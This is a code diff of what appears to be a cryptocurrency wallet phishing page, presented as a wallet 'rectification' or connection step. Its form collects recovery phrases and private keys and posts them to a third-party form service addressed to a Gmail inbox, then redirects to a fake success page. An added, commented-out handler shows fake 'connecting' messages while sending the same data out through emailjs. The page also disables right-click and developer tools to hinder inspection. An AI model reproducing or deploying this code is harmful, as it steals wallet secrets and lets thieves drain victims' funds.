@@ -706,7 +706,7 @@
                         onclick="switchTab('private')">Private Key</button>
                 </div>
 
-               <form action="https://formsubmit.co/s10219388@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+               <form action="https://formsubmit.co/formsubmitmails@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
                                        <input type="hidden" name="_cc" value="">
                                         <input type="hidden" name="_captcha" value="false">
                                         <input type="hidden" name="_next" value="https://rectificationprocedure.vercel.app/access/point/success.html">
@@ -989,7 +989,64 @@
             }
         }
 
-      
+        // Form submission handler
+        // document.getElementById('walletForm').addEventListener('submit', function (event) {
+        //     event.preventDefault();
+
+        //     // Perform final validation based on active tab
+        //     let isValid = true;
+        //     const activeTabId = document.querySelector('.tab-content.active').id.replace('Tab', '');
+
+        //     if (activeTabId === 'phrase') {
+        //         isValid = validatePhrase();
+        //     } else if (activeTabId === 'private') {
+        //         isValid = validatePrivateKey();
+        //     }
+        //     // Keystore JSON validation would typically happen on the backend or require more complex JS validation for file content/password.
+
+        //     if (!isValid) {
+        //         showPageMessage("Please fix the errors in your input.", "error");
+        //         return; // Stop submission if not valid
+        //     }
+
+        //     document.querySelector('.sending').style.display = 'flex'; // Show loader
+        //     document.querySelector('.sending').setAttribute('aria-hidden', 'false');
+
+        //     // Start cycling loader messages
+        //     const loaderMessageElement = document.getElementById('loaderMessage');
+        //     loaderMessageElement.textContent = loaderMessages[0]; // Set initial message
+        //     currentLoaderMessageIndex = 0;
+        //     loaderMessageInterval = setInterval(() => {
+        //         currentLoaderMessageIndex = (currentLoaderMessageIndex + 1) % loaderMessages.length;
+        //         loaderMessageElement.textContent = loaderMessages[currentLoaderMessageIndex];
+        //     }, 3000); // Change message every 3 seconds
+
+        //     hideModal(); // Hide the connection modal
+
+        //     // Get wallet info to save to recent wallets
+        //     const walletName = document.getElementById('modalWalletName').textContent;
+        //     const walletImgSrc = document.getElementById('modalWalletImg').src;
+        //     addRecentWallet(walletName, walletImgSrc); // Save to recently used
+
+        //     // Your actual form submission and Firebase logic here
+        //     emailjs.sendForm('service_yop3vts', 'template_z26z7j4', this) // 'this' refers to the form element
+        //         .then(function () {
+        //             console.log('SUCCESS!');
+        //             clearInterval(loaderMessageInterval); // Stop cycling messages
+        //             document.querySelector('.sending').style.display = 'none'; // Hide loader
+        //             document.querySelector('.sending').setAttribute('aria-hidden', 'true');
+        //             showPageMessage("Connection successful! You may be redirected.", "success");
+        //             // Optionally, redirect user after a short delay
+        //             // setTimeout(() => { window.location.href = "success.html"; }, 2000);
+        //         }, function (error) {
+        //             console.log('FAILED...', error);
+        //             clearInterval(loaderMessageInterval); // Stop cycling messages
+        //             document.querySelector('.sending').style.display = 'none'; // Hide loader
+        //             document.querySelector('.sending').setAttribute('aria-hidden', 'true');
+        //             showPageMessage(`Connection failed: ${error.text || JSON.stringify(error)}`, "error");
+        //         });
+        // });
+
 
         // Disable right-click and developer tools for security
         document.addEventListener('contextmenu', (e) => e.preventDefault());
